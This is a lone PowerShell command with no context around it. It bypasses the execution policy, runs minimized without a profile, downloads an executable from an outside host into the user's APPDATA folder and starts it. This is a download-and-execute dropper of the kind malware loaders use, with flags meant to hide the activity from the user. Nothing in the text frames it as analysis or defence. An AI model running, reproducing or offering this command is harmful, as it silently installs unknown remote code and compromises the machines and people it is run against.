
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle minimized -command (New-Object System.Net.WebClient).DownloadFile('https://a.vidga.me/thgohw.exe', $env:APPDATA\Example.exe );Start-Process ( $env:APPDATA\Example.exe )

